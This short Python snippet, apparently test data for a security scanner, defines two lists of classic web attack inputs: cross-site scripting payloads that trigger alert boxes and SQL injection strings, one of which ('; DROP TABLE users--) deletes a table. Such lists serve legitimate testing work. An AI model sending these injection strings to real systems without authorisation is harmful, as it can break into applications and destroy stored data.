XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>"
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "'; DROP TABLE users--"
]